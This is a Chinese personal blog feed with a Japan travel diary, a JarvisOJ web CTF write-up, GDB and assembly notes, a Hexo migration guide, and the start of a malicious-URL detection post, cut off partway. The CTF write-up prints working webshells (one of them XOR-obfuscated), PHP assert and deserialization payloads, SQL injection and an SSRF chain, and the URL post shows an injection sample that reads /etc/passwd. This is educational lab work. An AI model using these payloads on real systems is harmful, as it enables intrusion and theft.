        <content type="html"><![CDATA[<p>这是一个记录自己成长的博客主页，也不强求多么成功，只是随心所欲。所以放上来的东西比较杂，也当作培养一下写日志的习惯。</p><span id="more"></span><p>从1月中旬一直到4月份都没怎么写东西了，其实不是因为懒，也不是因为没有学习停滞不前。</p><h2 id="Reason-1"><a href="#Reason-1" class="headerlink" title="Reason 1"></a>Reason 1</h2><p>一月中旬公司放假之后，我和小伙伴去日本玩了一趟。很早就有朋友安利我说日本是一个很吸引人的国度，去了之后才知道果然所言非虚。</p><p>当然日本的风景很漂亮，给我印象最深是那里的天空。万里无云、碧蓝晴空，无法用语言表达。其实在国内也能看到那样的天空，只不过一年365天可能只有十分之一的时间可以看到，而日本几乎天天可以看到（据导游说）。其他的风景包括建筑啊，山水啊啥的，说实话还不如国内的很多景区，在我眼里都差不多。</p><p><img src="/img/Diary1/Diary1.JPG" alt="东京的天空"></p><p><img src="/img/Diary1/Diary2.JPG" alt="东京的天空"></p><p>日本的人文让我感触良多，其实总结起来主要是三点。</p><p>第一是安静。我本身就是个喜欢安静环境的人，在日本期间，体验了日本的乡村和城市，都特别安静。乡村可能是因为高度城市化的原因，到了晚上8点，路上基本上就没有人了，连车也很少。有一天晚上9点左右，我和朋友想出去吃点东西，走在空无一人的乡间小道上，正好那天日本下大雪，万籁俱静，那真的是如行走在梦境一般。</p><p><img src="/img/Diary1/Diary3.JPG" alt="下雪的日本乡村（真的很美，原谅我的拍照技术）"></p><p><img src="/img/Diary1/Diary4.JPG" alt="雪后的Mount Fuji"></p><p>日本的城市相对而言就比较繁华了，但是到了晚上9点后，相较于中国的城市，其实街上的行人也很少。日本的城市真的很安静，就算在大商场里，售货员和顾客的交流也很小声。在国内，每次一进商场，我就感觉头疼，像是有人拿着喇叭在脑子里喊一样。</p><p>日本第二点吸引我的是干净。日本有个很奇怪的点，他们的道路上没有一个垃圾桶，但是路上也没有任何垃圾。乡下可能是因为人少，可是就算是城市里，也是一样的干净。</p><p>第二点很大程度上和日本吸引我的第三点有关，就是国民守规矩的程度。日本人真的太守规矩了，不论是在城市，还是在空无一人的乡村，我没见过任何一个司机闯红灯，也没见过任何一个行人随意横跨马路。即使是乡间小道，两步就能跨过去的道路，日本人还是要规规矩矩的走到路口斑马线，等红绿灯，有序通过。可能有人觉得这是教条，呆板，可我觉得从小见大，这是一个很难得的素质。</p><p><img src="/img/Diary1/Diary5.JPG" alt="景区里见到的休息时的日本小朋友（真的很听话）"></p><p>在日本还遇到了两个很可爱的动物。</p><p><img src="/img/Diary1/Diary6.JPG" alt="奈良的鹿"></p><p><img src="/img/Diary1/Diary7.JPG" alt="东京的猫"></p><h2 id="Reason-2"><a href="#Reason-2" class="headerlink" title="Reason 2"></a>Reason 2</h2><p>从日本回来之后就遇到了新冠疫情，在家宅了很久很久。实在闲的无聊，突然想起当CTF比赛时被虐千百遍的PWN题，于是乎决定发奋图强，开始学汇编。</p><p>所以其实这段时间一直在学汇编，学PWN，学Reverse。经过三个月的“复习”（大学的汇编课程已经全部还给老师了&#x3D;&#x3D;），终于算是入门了，后面可能会一直钻研这个方向，因为自己对这方面比较感兴趣。</p><p>对了，安利一个CTF PWN环境<a href="https://github.com/Escapingbug/ancypwn">ancypwn</a>，从长亭那里学来的哦，真的很好用。</p>]]></content>
      
      
      <categories>
          
          <category> Miscellaneous </category>
          
          <category> Trips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
            <tag> Japan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JarvisOJ - Web の Write-Up Part 2</title>
      <link href="/2020/05/01/JarvisOJ-WEB-2/"/>
      <url>/2020/05/01/JarvisOJ-WEB-2/</url>
      
        <content type="html"><![CDATA[<p>接上回书说到JarvisOJ的Web部分题目<a href="https://coldwave96.github.io/2020/03/11/JarvisOJ-WEB-1/">Part 1</a>，现在继续分解Part 2。</p><span id="more"></span><h2 id="RE"><a href="#RE" class="headerlink" title="RE?"></a>RE?</h2><p>打开链接下载得到一个udf.so文件，搜索了一下这是个mysql的插件。首先查看mysql插件的存放位置：</p><p><img src="/img/JarvisOJ-WEB-2/WEB1.png"></p><p>然后把下载的文件放到这个目录下面，按照题目提示的help_me()函数一步一步探寻即可找到flag：</p><p><img src="/img/JarvisOJ-WEB-2/WEB2.png"></p><h2 id="Simple-Injection"><a href="#Simple-Injection" class="headerlink" title="Simple Injection"></a>Simple Injection</h2><p>打开是一个登录界面，burp抓包使用sqlmap跑出来username存在注入漏洞，不过由于过滤了空格所以需要加参数—tamper&#x3D;space2comment</p><p><img src="/img/JarvisOJ-WEB-2/WEB3.png"></p><p>最后得到password的值为334cfb59c9d74849801d5acdcfdaadc3。</p><p>解md5后得:eTAloCrEP。</p><p>登陆后得到flag:CTF{s1mpl3_1nJ3ction_very_easy!!}</p><h2 id="Easy-Gallery"><a href="#Easy-Gallery" class="headerlink" title="Easy Gallery"></a>Easy Gallery</h2><p>打开是一个网站，submit和view界面分别可以上传图片和查看图片：</p><p><img src="/img/JarvisOJ-WEB-2/WEB4.png"></p><p><img src="/img/JarvisOJ-WEB-2/WEB5.png"></p><p>上传图片有验证，修改上传文件后缀和抓包更改content-type都不行。猜测验证机制在后台并且会检测文件头，那只能选择一句话图片马了。上传之后会返回图片ID，在view界面输入id和type可以看到自己的图片。</p><p>但是这并没有什么用啊，没法执行。查看主页url发现一个很有趣的参数page，猜测这个参数存在文件包含漏洞。尝试了一下，提示里有信息：</p><p><img src="/img/JarvisOJ-WEB-2/WEB6.png"></p><p>系统会给文件自动添加一个.php的后缀，尝试%00截断，没有回显。应该是存在截断漏洞，但是被某种方法防护了。猜测是后台过滤了一些东西，找了些提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="title function_ invoke__">eval_r</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>换了一个小马，重新制作图片马，重新上传加首页包含：</p><p><img src="/img/JarvisOJ-WEB-2/WEB7.png"></p><h2 id="Babyphp"><a href="#Babyphp" class="headerlink" title="Babyphp"></a>Babyphp</h2><p>打开是一个网站，在About界面提到了GIT，通过<a href="https://github.com/ring04h/weakfilescan">weakfilescan</a>扫到了config文件：</p><p><img src="/img/JarvisOJ-WEB-2/WEB8.png"></p><p><img src="/img/JarvisOJ-WEB-2/WEB9.png"></p><p>猜测存在git泄露，通过<a href="https://github.com/lijiejie/GitHack">GitHack</a>得到网站源代码：</p><p><img src="/img/JarvisOJ-WEB-2/WEB10.png"></p><p><img src="/img/JarvisOJ-WEB-2/WEB11.png"></p><p>在index.php源代码中发现漏洞：</p><p><img src="/img/JarvisOJ-WEB-2/WEB12.png"></p><p>assert函数解释：</p><p>assert(mixed $assertion [, Throwable $exception])</p><p>assert()会检查指定的assertion并在结果为FALSE时采取适当的行动.就是说如果assertion是字符串，它将会被assert()当做PHP代码来执行。所以构造payload：<code>page=&#39;.system(&quot;cat templates/flag.php&quot;).&#39;</code></p><p><img src="/img/JarvisOJ-WEB-2/WEB13.png"></p><h2 id="Inject"><a href="#Inject" class="headerlink" title="Inject"></a>Inject</h2><p>根据题目的提示寻找源码，扫到index.php～文件，查看页面源代码：</p><p><img src="/img/JarvisOJ-WEB-2/WEB14.png"></p><p>关于该段源代码的详细分析，推荐参考这篇<a href="https://blog.csdn.net/qq_42939527/article/details/100129254">Blog</a>。</p><p>最终构造payload：?table&#x3D;test` `union select group_concat(flagUwillNeverKnow) from secret_flag获得flag。</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB?"></a>WEB?</h2><p>打开链接只是一个登录框，试了半天的注入，折腾很久毫无收获，查看源码,有个奇怪的app.js：</p><p><img src="/img/JarvisOJ-WEB-2/WEB15.png"></p><p>格式化一下javascript脚本：</p><p><img src="/img/JarvisOJ-WEB-2/WEB16.png"></p><p>输入的密码应该是被以POST方式发送出去了，于是在源代码中找下post，看下能不能发现什么线索：</p><p><img src="/img/JarvisOJ-WEB-2/WEB17.png"></p><p>在这段代码上方不远处找到一个有趣的函数：</p><p><img src="/img/JarvisOJ-WEB-2/WEB18.png"></p><p>把value部分提出来看下：</p><p><img src="/img/JarvisOJ-WEB-2/WEB19.png"></p><p>貌似是个方程组，解一下得到25个解：</p><p>data &#x3D; [81,87,66,123,82,51,97,99,55,95,49,115,95,105,110,116,101,114,101,115,116,105,110,103,125]</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span> flag</span><br></pre></td></tr></table></figure><p>运行python脚本即可获得flag。</p><h2 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h2><p>打开页面后是源代码：</p><p><img src="/img/JarvisOJ-WEB-2/WEB20.png"></p><p>仔细阅读代码，加上题目提示的phpinfo.php界面看到的phpinfo信息，发现是php的seesion的反序列化问题。具体的问题分析可以看<a href="https://blog.csdn.net/wy_97/article/details/78430690">这里</a>。</p><p>构造一个上传和post同时进行的情况：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>test XXE<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><span class="comment">&lt;!-- </span></span><br><span class="line"><span class="comment">不对字符编码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;go&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后构造payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mdzz</span> = <span class="string">&quot;print_r(scandir(dirname(__FILE__)));&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">OowoO</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>生成payload：<code>O:5:&quot;OowoO&quot;:1:&#123;s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;&#125;</code></p><p>但是要在双引号前加上反斜杠，防止转义错误；还要在O前面加上“|”：<code>|O:5:\&quot;OowoO\&quot;:1:&#123;s:4:\&quot;mdzz\&quot;;s:36:\&quot;print_r(scandir(dirname(__FILE__)));\&quot;;&#125;</code></p><p>利用上面的上传界面随意上传一个文件，然后使用BP截包，把文件名改为payload即可得到flag文件名“Here_1s_7he_fl4g_buT_You_Cannot_see.php”。</p><p>然后再次把“_FILE_”改成：”&#x2F;opt&#x2F;lampp&#x2F;htdocs&#x2F;Here_1s_7he_fl4g_buT_You_Cannot_see.php”即可获得flag。</p><h2 id="Chopper"><a href="#Chopper" class="headerlink" title="Chopper"></a>Chopper</h2><p>首先看到的是一把菜刀：</p><p><img src="/img/JarvisOJ-WEB-2/WEB21.png"></p><p>点击管理员登录提示<code>you are not admin!</code></p><p>查看图片地址为<code>http://web.jarvisoj.com:32782/proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg</code></p><p>一下子精神了，也许是远程文件包含？</p><p>再看了一下管理员界面源码：</p><p><img src="/img/JarvisOJ-WEB-2/WEB22.png"></p><p>尝试了加X-Forwarded-For头部，发现并没什么用。</p><p>于是构造POC：<code>http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/</code>即可访问到admin目录。</p><p>接下来扫描目录，在robots.txt中找到木马文件trojan.php及该木马的源码trojan.php.txt。</p><p>但是源码是进行异或处理的:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $&#123;(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>).(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>)&#125;=(<span class="string">&quot;!&quot;</span>^<span class="string">&quot;`&quot;</span>).(<span class="string">&quot;( &quot;</span>^<span class="string">&quot;&#123;&quot;</span>).(<span class="string">&quot;(&quot;</span>^<span class="string">&quot;[&quot;</span>).(<span class="string">&quot;~&quot;</span>^<span class="string">&quot;;&quot;</span>).(<span class="string">&quot;|&quot;</span>^<span class="string">&quot;.&quot;</span>).(<span class="string">&quot;*&quot;</span>^<span class="string">&quot;~&quot;</span>);$&#123;(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>).(<span class="string">&quot;#&quot;</span>^<span class="string">&quot;|&quot;</span>)&#125;((<span class="string">&quot;-&quot;</span>^<span class="string">&quot;H&quot;</span>). (<span class="string">&quot;]&quot;</span>^<span class="string">&quot;+&quot;</span>). (<span class="string">&quot;[&quot;</span>^<span class="string">&quot;:&quot;</span>). (<span class="string">&quot;,&quot;</span>^<span class="string">&quot;@&quot;</span>). (<span class="string">&quot;&#125;&quot;</span>^<span class="string">&quot;U&quot;</span>). (<span class="string">&quot;e&quot;</span>^<span class="string">&quot;A&quot;</span>). (<span class="string">&quot;(&quot;</span>^<span class="string">&quot;w&quot;</span>).(<span class="string">&quot;j&quot;</span>^<span class="string">&quot;:&quot;</span>). (<span class="string">&quot;i&quot;</span>^<span class="string">&quot;&amp;&quot;</span>). (<span class="string">&quot;#&quot;</span>^<span class="string">&quot;p&quot;</span>). (<span class="string">&quot;&gt;&quot;</span>^<span class="string">&quot;j&quot;</span>). (<span class="string">&quot;!&quot;</span>^<span class="string">&quot;z&quot;</span>). (<span class="string">&quot;T&quot;</span>^<span class="string">&quot;g&quot;</span>). (<span class="string">&quot;e&quot;</span>^<span class="string">&quot;S&quot;</span>). (<span class="string">&quot;_&quot;</span>^<span class="string">&quot;o&quot;</span>). (<span class="string">&quot;?&quot;</span>^<span class="string">&quot;b&quot;</span>). (<span class="string">&quot;]&quot;</span>^<span class="string">&quot;t&quot;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>为了知道这个webshell的密码，把木马文件放在本地的Web服务器上执行，通过报错知道密码为360。</p><p>最后利用密码POST数据<code>360 = system(&#39;ls&#39;)</code>，即可获得flag：CTF{fl4g_1s_my_c40d40_1s_n0t_y0urs}。</p><h2 id="To-Be-Continue"><a href="#To-Be-Continue" class="headerlink" title="To Be Continue"></a>To Be Continue</h2><p>JarvisOJ的Web部分题目暂告一段落，还有几题没做，后面有动力做了的话再单独写下WriteUps。最近迷上学习的PWN&amp;Reverse了，虽然他们虐我千百遍，我却仍待他们如初恋（我怎么这么菜啊T.T）。</p>]]></content>
      
      
      <categories>
          
          <category> WriteUPs </category>
          
          <category> JarvisOJ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用GDB指令</title>
      <link href="/2020/05/01/GDBcommand/"/>
      <url>/2020/05/01/GDBcommand/</url>
      
        <content type="html"><![CDATA[<p>不断完善中！！！</p><span id="more"></span><h1 id="选择加载文件"><a href="#选择加载文件" class="headerlink" title="选择加载文件"></a>选择加载文件</h1><p>file [file_name]<br>exec-file [file_name]</p><h1 id="执行"><a href="#执行" class="headerlink" title="执行"></a>执行</h1><p>r(run)</p><h1 id="反编译main函数"><a href="#反编译main函数" class="headerlink" title="反编译main函数"></a>反编译main函数</h1><p>disas [function_name]<br>disassemble [function_name]</p><h1 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h1><p>b(break)<br>b [function_name] # 对函数下断点<br>b *addr # 对地址下断点<br>info b # 查看断点</p><p>registers code stack<br>寄存器取值  代码   栈</p><h1 id="查看寄存器情况"><a href="#查看寄存器情况" class="headerlink" title="查看寄存器情况"></a>查看寄存器情况</h1><p>info [register]</p><h1 id="单步调试"><a href="#单步调试" class="headerlink" title="单步调试"></a>单步调试</h1><p>n(next)</p><h1 id="步进（到某个函数）"><a href="#步进（到某个函数）" class="headerlink" title="步进（到某个函数）"></a>步进（到某个函数）</h1><p>si(step into)</p><h1 id="查看现在的堆栈情况"><a href="#查看现在的堆栈情况" class="headerlink" title="查看现在的堆栈情况"></a>查看现在的堆栈情况</h1><p>bt(backtrace)</p><h1 id="继续到下一个断点"><a href="#继续到下一个断点" class="headerlink" title="继续到下一个断点"></a>继续到下一个断点</h1><p>c(continue)</p><h1 id="打印地址值"><a href="#打印地址值" class="headerlink" title="打印地址值"></a>打印地址值</h1><p>x&#x2F;wx adress # w代表word，在32位嵌入式系统中，一个字WORD占32bit，即4个字节<br>例如：<br>x&#x2F;10wx 0xffffce90 # 10代表打印10个，w代表32位，可以换成b&#x2F;h&#x2F;g，分别对应1，2，8byte，x可以替换为u(unsigned int)&#x2F;s(string)&#x2F;d(10进制)&#x2F;i(指令)</p><h1 id="设置地址的值"><a href="#设置地址的值" class="headerlink" title="设置地址的值"></a>设置地址的值</h1><p>set *addr &#x3D; value # 设置地址的值</p><h1 id="列出源码"><a href="#列出源码" class="headerlink" title="列出源码"></a>列出源码</h1><p>list</p><h1 id="打印变量值"><a href="#打印变量值" class="headerlink" title="打印变量值"></a>打印变量值</h1><p>print val_name</p><h1 id="查看所有局部变量的值"><a href="#查看所有局部变量的值" class="headerlink" title="查看所有局部变量的值"></a>查看所有局部变量的值</h1><p>info local</p><h1 id="gdb-peda版本中特殊功能"><a href="#gdb-peda版本中特殊功能" class="headerlink" title="gdb-peda版本中特殊功能"></a>gdb-peda版本中特殊功能</h1><p>elfsymbol # 可以把程序中的函数及地址列出来（ROP中很有用）<br>vmmap # 查看进程中的权限<br>readelf # 查看section<br>find [string] # 在内存中查找字符串</p>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> Assembler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Reverse </tag>
            
            <tag> Updating </tag>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编指令长度</title>
      <link href="/2020/05/01/AssembleCommand/"/>
      <url>/2020/05/01/AssembleCommand/</url>
      
        <content type="html"><![CDATA[<p>不断完善中！！！</p><span id="more"></span><h2 id="没有操作数的指令"><a href="#没有操作数的指令" class="headerlink" title="没有操作数的指令"></a>没有操作数的指令</h2><ul><li>指令长度为1个字节，如：pop rax</li></ul><h2 id="操作数只涉及寄存器的的指令"><a href="#操作数只涉及寄存器的的指令" class="headerlink" title="操作数只涉及寄存器的的指令"></a>操作数只涉及寄存器的的指令</h2><ul><li>指令长度为2个字节，如：mov bx,ax</li></ul><h2 id="操作数涉及内存地址的指令"><a href="#操作数涉及内存地址的指令" class="headerlink" title="操作数涉及内存地址的指令"></a>操作数涉及内存地址的指令</h2><ul><li>指令长度为3个字节，如：mov ax,ds:[bx+si+idata]</li></ul><h2 id="操作数涉及立即数的指令"><a href="#操作数涉及立即数的指令" class="headerlink" title="操作数涉及立即数的指令"></a>操作数涉及立即数的指令</h2><ul><li><p>指令长度为：寄存器类型+1</p></li><li><p>8位寄存器，寄存器类型&#x3D;1，如：mov al,8；指令长度为2个字节</p></li><li><p>16位寄存器，寄存器类型&#x3D;2，如：mov ax,8；指令长度为3个字节</p></li></ul><h2 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h2><h3 id="段内跳转"><a href="#段内跳转" class="headerlink" title="段内跳转"></a>段内跳转</h3><ul><li><p>指令长度为2个字节或3个字节，jmp指令本身占1个字节</p></li><li><p>段内短转移，8位位移量占一个字节，加上jmp指令一个字节，整条指令占2个字节，如：jmp short opr</p></li><li><p>段内近转移，16位位移量占两个字节，加上jmp指令一个字节，整条指令占3个字节<br>如：jmp near ptr opr</p></li></ul><h3 id="断间跳转"><a href="#断间跳转" class="headerlink" title="断间跳转"></a>断间跳转</h3><ul><li>指令长度为5个字节，如：jmp dword ptr table[bx][di]，或 jmp far ptr opr，或 jmp dword ptr opr</li></ul><h2 id="inc指令"><a href="#inc指令" class="headerlink" title="inc指令"></a>inc指令</h2><ul><li>占用一个字节</li></ul><h2 id="push指令"><a href="#push指令" class="headerlink" title="push指令"></a>push指令</h2><ul><li>占用一个字节</li></ul><h2 id="segment声明"><a href="#segment声明" class="headerlink" title="segment声明"></a>segment声明</h2><ul><li>占用两个字节，如codesg segment</li></ul><h2 id="int-21h"><a href="#int-21h" class="headerlink" title="int 21h"></a>int 21h</h2><ul><li>占用两个字节</li></ul>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
          <category> Assembler </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Reverse </tag>
            
            <tag> Updating </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>将Hexo从Windows迁移到Mac上的踩坑教学</title>
      <link href="/2020/05/01/WintoMac/"/>
      <url>/2020/05/01/WintoMac/</url>
      
        <content type="html"><![CDATA[<p>我终于换MAC了！！！我终于换MAC了！！！我终于换MAC了！！！</p><p>重要的事情说3遍，其实我已经换MAC半年了，但是依然很兴奋，毕竟这台电脑的价格比我之前所有电脑加起来都贵&#x3D;&#x3D;。刚换的时候就想把hexo转移到MAC，拖到现在才搬家的理由只有一个：懒！！！</p><p>话不多说，开始踩坑。</p><span id="more"></span><h2 id="安装git和node-js"><a href="#安装git和node-js" class="headerlink" title="安装git和node.js"></a>安装git和node.js</h2><p><code>brew install git</code></p><p><code>brew install node</code></p><p>至于brew，emm，baidu了解一下。</p><h2 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h2><p>使用node.js来安装：</p><p><code>npm install hexo-cli -g</code></p><p>这是第一个坑，一开始我用的是<code>npm install hexo g</code>命令安装的hexo，虽然可以成功安装hexo，可是用的时候会出现<code>hexo: COMMAND NOT FOUND</code>问题。</p><h2 id="初始化hexo"><a href="#初始化hexo" class="headerlink" title="初始化hexo"></a>初始化hexo</h2><p>新建一个hexo目录，比如<code>/Blog</code>这种，然后<code>hexo init</code></p><p>再用<code>hexo s</code>测试是否成功，打开<code>localhost:4000</code>查看本地hexo界面是否正常显示。</p><h2 id="生成SSH-Key"><a href="#生成SSH-Key" class="headerlink" title="生成SSH Key"></a>生成SSH Key</h2><p>先查看本地的SSH Key：<code>cd ~/.ssh</code></p><p>如果没有，生成一个SSH Key：<code>ssh-keygen -t rsa -C &quot;example@example.com&quot;</code>，最后那个是注册邮箱。</p><h2 id="将SSH-Key添加到Github"><a href="#将SSH-Key添加到Github" class="headerlink" title="将SSH Key添加到Github"></a>将SSH Key添加到Github</h2><p>进入.ssh文件夹：<code>cd ~/.ssh</code>，然后打开里面的<code>id_rsa.pub</code>文件，里面的内容就是SSH key，复制全部内容；</p><p>网页打开github的设置：Settings -&gt; SSH and GPG keys，点击绿色的按钮New SSH key，然后在输入框中输入刚才复制的内容；</p><p>保存后，github可能会向你的邮箱发送一个验证链接（如果有记得去邮箱验证，不然之后的hexo部署会一直不成功的）。</p><p>测试一下是否成功：<code>ssh git@github.com</code></p><p>看到下面的即成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PTY allocation request failed on channel 0</span><br><span class="line">Hi gjincai! You<span class="string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br><span class="line"><span class="string">Connection to github.com closed.</span></span><br></pre></td></tr></table></figure><h2 id="文件配置转移"><a href="#文件配置转移" class="headerlink" title="文件配置转移"></a>文件配置转移</h2><p>windows下的博客根目录hexo，复制该目录下的：<code>_config.yml</code>, <code>scaffolds</code>, <code>source</code>, <code>themes</code>；</p><p>直接覆盖替换mac下的博客根目录hexo相同的文件和文件夹。</p><h2 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h2><p>理论上这样就完成了，但是实际上还会有问题。</p><p>这是第二个坑，这时<code>hexo g &amp;&amp; hexo d</code>依然不成功，是因为缺少了模块，需要执行命令<code>npm install hexo-deployer-git --save</code></p><p>你以为这样就完成了么，不，下面是第三个坑。</p><p>hexo重新部署之后，博客界面显示<code>extends includes/layout.pug block content include includes/recent-posts.pug include includes/partial</code></p><p>解决方案：</p><ul><li><p>执行命令<code>npm install --save hexo-renderer-jade hexo-generator-feed hexo-generator-sitemap hexo-browsersync hexo-generator-archive</code></p></li><li><p>清除缓存<code>hexo clean</code></p></li><li><p>生成静态文件<code>hexo g</code></p></li></ul><p>这样就大功告成，再次<code>hexo d</code>部署就可以啦。</p>]]></content>
      
      
      <categories>
          
          <category> Miscellaneous </category>
          
          <category> Sites </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blogs </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习实现恶意URL检测Part 2</title>
      <link href="/2020/04/20/MaliciousURLs2/"/>
      <url>/2020/04/20/MaliciousURLs2/</url>
      
        <content type="html"><![CDATA[<h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>在原来<a href="https://github.com/Coldwave96/MaliciousURLs">第一版恶意URL检测</a>的基础上，改进了数据处理方式，调整了代码结构，实现了<a href="https://github.com/Coldwave96/MaliciousUrls_Part2">第二版的恶意URL检测</a>。</p><span id="more"></span><h2 id="提取数据"><a href="#提取数据" class="headerlink" title="提取数据"></a>提取数据</h2><p>这一版添加了从pcap数据包中提取url的代码。通过<a href="https://github.com/invernizzi/scapy-http">scapy_http库</a>从pcap包中筛选http协议的报文，再从报文中截取url保存为满足条件的文件格式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/html/device-id</span><br><span class="line">/centreon/include/views/graphs/graphStatus/displayServiceStatus.php?session_id=%27%20or%201=1%20--%20/**&amp;template_id=%27%20UNION%20ALL%20SELECT%201,2,3,4,5,CHAR(59,%2032,%2099,97,116,32,47,101,116,99,47,112,97,115,115,119,100,%2059),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%20--%20/**</span><br><span class="line">/centreon/include/configuration/configObject/traps/GetXMLTrapsForVendor.php</span><br><span class="line">/admin/backup/</span><br></pre></td></tr></table></figure><h2 id="处理数据"><a href="#处理数据" class="headerlink" title="处理数据"></a>处理数据</h2><p>训练的样本数据也最好处理成上面那种数据格式，这样有利于最大化的处理数据，提取特征。</p><p>本次训练的样本来部分自于安全设备上收集的url以及互联网上的样本。只是为了验证本次实验代码的效率，所以样本覆盖面不是很广，在实验最后总结中还会再次提到这个问题。</p><h2 id="数据预处理"><a href="#数据预处理" class="headerlink" 